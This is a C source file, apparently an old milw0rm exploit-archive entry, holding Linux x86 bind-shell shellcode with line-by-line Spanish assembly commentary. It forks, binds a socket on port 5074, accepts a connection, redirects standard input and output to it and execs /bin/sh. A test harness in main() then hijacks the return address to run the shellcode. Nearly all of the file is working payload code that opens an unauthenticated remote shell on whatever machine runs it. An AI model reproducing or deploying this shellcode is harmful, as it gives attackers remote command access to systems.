/*
 * s0t4ipv6@shellcode.com.ar
 * 0x9abril0x7d2

sys_socketcall (102) (0x66) %eax, esta es nuestra rutina principal.
En todas las subrutinas vamos a necesitar a:

%eax = 0x66.

Luego del archivo include/linux/net.h obtenemos la siguiente lista, echenle un vistazo.
Entonces en %ebx vamos a necesitar el valor de la subrutina que estemos.

subrutina       %ebx
--------------------
SYS_SOCKET      0x1
SYS_BIND        0x2
SYS_CONNECT     0x3
SYS_LISTEN      0x4
SYS_ACCEPT      0x5
--------------------

En memoria vamos asi
Cada subrutina va a afectar a %ebp de la siguiente forma
%ebp
---------------------------------------------------------
offset  0x8     0xc     0x10    0x14    0x16    0x18
=========================================================
socket  |0x2    |0x1    |0x0    |///////|///////|///////|
        -------------------------------------------------
bind    |0x5(1) |*0x14  |0x10   |0x2    |0xd213 |0x0    |
        -------------------------------------------------
listen  |0x5(1) |0x1    |0x10   |0x2    |0xd213 |0x0    |
        -------------------------------------------------
accept  |0x5(1) |0x0    |NULL   |0x2    |0xd213 |0x0    |
        -------------------------------------------------

*0x14   es la direccion de memoria de %ebp+14
(*1)    el valor de %eax cambia despues de cada syscall

(*2)	Remitirse al archivo adjunto notas-lnx-bind.txt

 *
 */

#include <stdio.h>

char shellcode[]=
// Shellcode                    // AsmCode                      / Comentarios                   Referencia kernel
// sys_fork (2)
"\x31\xc0"                      // xorl         %eax,%eax
"\x89\xc3"                      // movl         %eax,%ebx
"\xb0\x02"                      // movb         $0x2,%al	/ sys_fork (2)
"\xcd\x80"                      // int          $0x80
"\x38\xc3"                      // cmpl         %ebx,%eax	/ Pregunto; %eax = 0x0
"\x74\x05"                  	// je      	0x5		/ Si es verdadero me salto el la funcion exit

// sys_exit (1)
"\x8d\x43\x01"			// leal   	0x1(%ebx),%eax  / sys_exit (1)
"\xcd\x80"                      // int          $0x80

// Subrutina socket
// soccer=socket(2,1,0)
"\x31\xc0"                      // xorl    %eax,%eax
"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)	/ IPPROTO_IP = 0x0		include/linux/in.h
"\x40"                          // incl    %eax			/ %eax es 0x1
"\x89\xc3"                      // movl    %eax,%ebx		/ SYS_SOCKET = 0x1		include/linux/net.h
"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)	/ SOCK_STREAM = 0x1		include/linux/socket.h
"\x40"                          // incl    %eax			/ %eax es 0x2
"\x89\x45\x08"                  // movl    %eax,0x8(%ebp)	/ AF_INET = 0x2			include/linux/socket.h
"\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx	/ Direccion de nuestra construccion a %ecx
"\xb0\x66"                      // movb    $0x66,%al		/ sys_socketcall (102)
"\xcd\x80"                      // int     $0x80
"\x89\x45\x08"                  // movl    %eax,0x8(%ebp)	/ Guardo el valor de %eax en 0x8(%ebp) Ref(*1)

                                                                // %eax=0x5 %ebx=0x1 %ecx=(%edi+8) %edx=0x3
// Subrutina bind
// bind(soccer, (struct sockaddr*)&serv, sizeof(struct sockaddr))
"\x43"                          // incl    %ebx			/ SYS_BIND = 0x2		include/linux/net.h
"\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)	/ AF_INET = 0x2			include/linux/socket.h
"\x66\xc7\x45\x16\x13\xd2"      // movw    $0xd213,0x16(%ebp)	/ Numero de puerto 5074ipv6 ;-))
"\x31\xd2"                      // xorl    %edx,%edx
"\x89\x55\x18"                  // movl    %edx,0x18(%ebp)	/ %edx es 0x0
"\x8d\x55\x14"                  // leal    0x14(%ebp),%edx	/ Usamos %edx como registro intermedio
"\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)	/
"\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)	/ sizeof(struct sockaddr) = 10h = 16
"\xb0\x66"                      // movb    $0x66,%al		/	4 bytes = AF_INET
"\xcd\x80"                      // int     $0x80		/	4 bytes = Puerto
								//	8 bytes = 0.0.0.0

                                                                // %eax=0x0 %ebx=0x2 %ecx=(%edi+8) %edx=(%edi+14)
// Subrutina listen
// listen(soccer, 1)
"\x40"                          // incl    %eax
"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)	/ Aceptamos 1 conexion, 2 no tendria sentido
"\x43"				// incl	   %ebx			/ Ref(*2a)
"\x43"				// incl	   %ebx			/ SYS_LISTEN = 0x4		include/linux/net.h
"\xb0\x66"                      // movb    $0x66,%al
"\xcd\x80"                      // int     $0x80

                                                                // %eax=0x0 %ebx=0x4 %ecx(%edi+8) %edx=(%edi+14)
// Subrutina accept
// int accept(int s, struct sockaddr *addr, socklen_t *addrlen);
"\x43"                          // incl    %ebx			/ %ebx es 0x5
"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)	/ Ponemos 0 en 0xc(%ebp)
"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)	/ Y un NULL en 0x10(%ebp) Ref(*2b)
"\xb0\x66"                      // movb    $0x66,%al
"\xcd\x80"                      // int     $0x80
"\x89\xc3"                      // movl    %eax,%ebx		/ El valor de soccer a %ebx

// Ahora vamos a cambiar la syscall a sys_dup2 (63)
// dup2(soccer, 0) el valor de soccer ya lo tenemos en ebx 3 lineas arriba
"\x31\xc9"                      // xorl    %ecx,%ecx		/ %ecx es 0x0
"\xb0\x3f"                      // movb    $0x3f,%al		/ sys_dup2 (63)
"\xcd\x80"                      // int     $0x80		/
"\x41"                          // incl    %ecx			/ %ecx es 0x1
"\x80\xf9\x03"                  // cmpb    $0x3,%cl		/ Pregunto; %ecx = 3
"\x75\xf6"                      // jne     -0xa			/ si es falso salto al movb

// execve			// Minishell de Raise
"\x31\xd2"                      // xorl    %edx,%edx
"\x52"                          // pushl   %edx
"\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e
"\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f
"\x89\xe3"                      // movl    %esp,%ebx
"\x52"                          // pushl   %edx
"\x53"                          // pushl   %ebx
"\x89\xe1"                      // movl    %esp,%ecx
"\xb0\x0b"                      // movb    $0xb,%al		/ Raise: esta linea la modifique para reducir 1 byte
"\xcd\x80";                     // int     $0x80


void main () {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-12]